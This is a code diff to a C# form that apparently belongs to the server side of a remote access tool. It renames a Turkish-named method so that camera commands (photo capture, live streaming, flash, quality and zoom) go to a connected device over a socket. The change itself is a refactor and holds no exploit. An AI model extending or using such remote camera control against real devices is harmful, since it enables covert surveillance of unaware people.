@@ -52,7 +52,7 @@ namespace Server.Views
                     ((Control)tabPage2).Enabled = false;
                     flashmode = checkBox1.Checked ? "1" : "0";
                     resolution = comboBox6.SelectedItem.ToString() == "1" ? comboBox1.SelectedItem.ToString() : comboBox2.SelectedItem.ToString();
-                    MainWindow.KomutGonder("CAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("CAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI][0x09]", soketimiz);
                     label2.Text = "Çekiliyor..";
                 }
                 catch (Exception) { }
@@ -129,7 +129,7 @@ namespace Server.Views
                     flashmode = checkBox2.Checked ? "1" : "0";
                     label1.Visible = false;
                     resolution = comboBox4.SelectedItem.ToString();
-                    MainWindow.KomutGonder("LIVESTREAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI]" + comboBox3.SelectedItem.ToString().Replace("%", "") +
+                    MainWindow.GoToOurSocket("LIVESTREAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI]" + comboBox3.SelectedItem.ToString().Replace("%", "") +
                       "[VERI][0x09]", soketimiz);
                     enabled = true;
                 }
@@ -141,7 +141,7 @@ namespace Server.Views
             }
             else
             {
-                MainWindow.KomutGonder("LIVESTOP", "[VERI][0x09]", soketimiz);
+                MainWindow.GoToOurSocket("LIVESTOP", "[VERI][0x09]", soketimiz);
                 button4.Enabled = false; button4.Text = "Wait..";
 
             }
@@ -153,11 +153,11 @@ namespace Server.Views
             {
                 if (checkBox2.Checked)
                 {
-                    MainWindow.KomutGonder("LIVEFLASH", "[VERI]1[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("LIVEFLASH", "[VERI]1[VERI][0x09]", soketimiz);
                 }
                 else
                 {
-                    MainWindow.KomutGonder("LIVEFLASH", "[VERI]0[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("LIVEFLASH", "[VERI]0[VERI][0x09]", soketimiz);
                 }
             }
         }
@@ -168,7 +168,7 @@ namespace Server.Views
             {
                 if (!string.IsNullOrEmpty(comboBox3.SelectedItem.ToString()))
                 {
-                    MainWindow.KomutGonder("QUALITY", $"[VERI]{comboBox3.SelectedItem.ToString().Replace("%", "")}[VERI][0x09]", soketimiz);
+                    MainWindow.GoToOurSocket("QUALITY", $"[VERI]{comboBox3.SelectedItem.ToString().Replace("%", "")}[VERI][0x09]", soketimiz);
                 }
             }
         }
@@ -179,7 +179,7 @@ namespace Server.Views
             if (zoom < max)
             {
                 zoom += 1;
-                MainWindow.KomutGonder("ZOOM", $"[VERI]{zoom}[VERI][0x09]", soketimiz);
+                MainWindow.GoToOurSocket("ZOOM", $"[VERI]{zoom}[VERI][0x09]", soketimiz);
                 label5.Text = "Zoom: " + zoom.ToString();
             }
         }
@@ -189,7 +189,7 @@ namespace Server.Views
             if (zoom > 0)
             {
                 zoom -= 1;
-                MainWindow.KomutGonder("ZOOM", $"[VERI]{zoom}[VERI][0x09]", soketimiz);
+                MainWindow.GoToOurSocket("ZOOM", $"[VERI]{zoom}[VERI][0x09]", soketimiz);
                 label5.Text = "Zoom: " + zoom.ToString();
             }
         }
@@ -210,7 +210,7 @@ namespace Server.Views
         }
         private void Kamera_FormClosing(object sender, FormClosingEventArgs e)
         {
-            MainWindow.KomutGonder("LIVESTOP", "[VERI][0x09]", soketimiz);
+            MainWindow.GoToOurSocket("LIVESTOP", "[VERI][0x09]", soketimiz);
         }
 
         private void comboBox5_SelectedIndexChanged(object sender, EventArgs e)
